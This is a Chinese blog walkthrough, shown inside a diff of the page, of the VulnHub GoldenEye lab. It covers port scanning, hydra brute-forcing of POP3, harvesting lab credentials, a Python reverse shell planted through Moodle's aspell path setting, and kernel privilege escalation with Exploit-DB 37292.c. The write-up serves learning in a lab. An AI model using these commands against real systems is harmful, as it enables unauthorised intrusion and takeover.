-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-04 12:41:10" itemprop="dateModified" datetime="2021-07-04T12:41:10+08:00">2021-07-04</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>2.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>定个小目标，把50台vulhub玩一遍，探探其中奥秘。当然最终目标是获取root权限或者admin账号密码。本靶场目标是获取root目录下flag.txt文件。</p>
-<h1 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h1><p>靶机：GoldenEye 192.168.140.133</p>
-<p>攻击机：kali 192.168.140.128</p>
-<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="获取目标IP"><a href="#获取目标IP" class="headerlink" title="获取目标IP"></a>获取目标IP</h2><p>首先需要找到攻击目标,nmap -sP 192.168.140.0/24</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/1.png"></p>
-<h2 id="端口及服务扫描"><a href="#端口及服务扫描" class="headerlink" title="端口及服务扫描"></a>端口及服务扫描</h2><p>找到IP地址之后去探测目标机子上开了哪些服务和端口 </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.140.133</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/28/VulnHub-GoldenEye/2.png"></p>
-<p>共开放了4个端口，80端口web服务不可以访问。第一次遇到这种问题。nmap既然可以扫描到靶机，说明攻击机和靶机之间可以ping通，再试试宿主机ping虚拟机，发现不可以，查询ip之后，发现宿主机和虚拟机并不在同一个网段上，那就改了罢</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/3.png"></p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/4.png"></p>
-<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>成功ping通，访问web服务，同时也解决掉了之前MobaXterm的疑惑</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/5.png"></p>
-<p>看到此图的提示，进入/sev-home/目录中，发现登陆框，一定是要找相关用户名和密码。回到刚才的首页，F12看到terminal.js。</p>
-<p>通过报错信息也可看到中间件为apache</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/6.png"></p>
-<p>访问terminal.js看到以下信息</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/7.png"></p>
-<p>用burp的decoder模块解密密码，登陆成功，此处用户名一定是小写。</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/8.png"></p>
-<blockquote>
-<p>加密格式总结：</p>
-<ul>
-<li>Unicode：\u开头</li>
-<li>UTF8/URL：%开头</li>
-<li>UTF16：\x开头</li>
-<li>&amp;#73;：　73为ASCII码，对应I</li>
-</ul>
-</blockquote>
-<p>靶机在某个较高端口上开了pop3服务，此处指55007。pop3为邮件服务器</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/9.png"></p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/10.png"></p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/19.png"></p>
-<p>terminal.js中写道，make sure you update your default password(建议改成make sure to update your passwd),也就是说目前是默认密码。用户名为boris,暴力破解</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L 1.txt -P /usr/share/wordlists/fasttrack.txt  192.168.140.133 -s 55007 pop3</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/28/VulnHub-GoldenEye/11.png"></p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/12.png"></p>
-<p>密码为 secret1!</p>
-<p>通过nc telnet连接pop3，登陆并查看boris的邮件信息</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/13.png"></p>
-<p>其中三封邮件内容如下，</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/14.png"></p>
-<p>root发给boris的邮件</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/15.png"></p>
-<p>natalya发给boris的邮件</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/16.png"></p>
-<p>alec发给boris的邮件</p>
-<p>再查看natalya的邮件有什么信息。</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/17.png"></p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/18.png"></p>
-<p>得到用户名密码、服务器域名和网址，可在/etc/hosts可添加信息后访问</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Domain: severnaya-station.com&#x2F;gnocertdir</span><br><span class="line"></span><br><span class="line">point this servers IP to severnaya-station.com in &#x2F;etc&#x2F;hosts.</span><br></pre></td></tr></table></figure>
-
-<p>打开本机/etc/hosts。添加域信息</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/20.png"></p>
-<p>登陆网站看到登陆框，此处是一个开源的CMS系统moodle，用刚才得到的用户名和密码登陆即可</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/21.png"></p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/22.png"></p>
-<p>找到一封相关的邮件，邮件中标注doak的用户名：</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/23.png"></p>
-<p>知道用户名继续hydra爆破，登陆邮件服务器：</p>
-<p>此处因为实习原因，电脑更换，内网IP有所差，但实验内容不变。IP变为如下内容：</p>
-<p>靶机：GoldenEye 192.168.221.128</p>
-<p>攻击机：kali 192.168.221.130</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/24.png"></p>
-<p>得到doak的CMS的账户密码：</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/25.png"></p>
-<p>登陆CMS发现在doak隐私文件目录下for james文件下有一个txt文本，文本内容如下所示：</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/26.png"></p>
-<p>找到一个jpg文件位于以下位置：</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/27.png"></p>
-<p>使用wget下载到本地，并用strings或exiftool检查图片内容，发现Image Description字段为可疑base64</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import base64;s&#x3D;base64.&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/28/VulnHub-GoldenEye/28.png"></p>
-<p>解码后为xWinter1995x!。到此得到管理员的账号密码，所有人信息一览无余</p>
-<p>账号：admin</p>
-<p>密码：xWinter1995x!</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/29.png"></p>
-<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><h2 id="查找历史漏洞"><a href="#查找历史漏洞" class="headerlink" title="查找历史漏洞"></a>查找历史漏洞</h2><p>已知Moodle版本为2.2.3。可能存在远程命令执行漏洞CVE-2013-3630，msf中存在此payload，不过打不通。</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/30.png"></p>
-<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>首先Home -&gt; Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor，将Spell engine更换为PSpellShell。</p>
-<p>在Home -&gt; Site administration -&gt; Server -&gt; System paths的Path to aspell处上传代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.187.128&quot;,8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
-
-<p>监听本机8099端口</p>
-<p>并在Home -&gt; My profile -&gt; Blogs -&gt; Add a new entry中新建blog，输入任意字符，点Toggle Spellchecker。即可监听成功</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/33.png"></p>
-<p>靶机上有python 考虑用python获取TTY，否则无法执行某些命令，并查看用户名、内核信息和ID</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/34.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<p>根据之前获取的内核版本在Exploit-DB中找EXP</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/35.png"></p>
-<h2 id="37292-c提权"><a href="#37292-c提权" class="headerlink" title="37292.c提权"></a>37292.c提权</h2><p>建立HTTP服务传输EXP</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m  http.server 8000</span><br></pre></td></tr></table></figure>
-
-<p>进入靶机/tmp目录下载EXP</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/36.png"></p>
-<p>执行后提示gcc并没有安装，更改EXPgcc为cc编译</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/40.png"></p>
-<p>然后重新下载shell并编译</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/37.png"></p>
-<p>运行EXP成功提权，在root目录下找到.flag.txt，注意不是flag.txt</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/38.png"></p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/39.png"></p>
-<p>we get it!</p>
-<p><img src="/2021/05/28/VulnHub-GoldenEye/41.png"></p>
-<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
-<li><p>此处apache中间件无用武之地</p>
-</li>
-<li><p>用户名小写我是没想到</p>
-</li>
-</ul>
-<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
-<li>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
-<li>文章参考：<a target="_blank" rel="noopener" href="https://programmersought.com/article/93378040168/#_252">https://programmersought.com/article/93378040168/#_252</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.shawroot.cc/1842.html">https://www.shawroot.cc/1842.html</a></li>
-<li>nc实现telnet连接pop3：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LL458524906/article/details/74635272">https://blog.csdn.net/LL458524906/article/details/74635272</a></li>
-<li>aspell参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1764068">https://cloud.tencent.com/developer/article/1764068</a></li>
-<li>tty-teletypewriter：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000038466327">https://segmentfault.com/a/1190000038466327</a></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1711,7 +1569,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1720,7 +1578,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-count">58</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -1768,12 +1626,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">80k</span>
+    <span title="站点总字数">83k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:13</span>
+    <span title="站点阅读时长">1:15</span>
 </div>
 
         
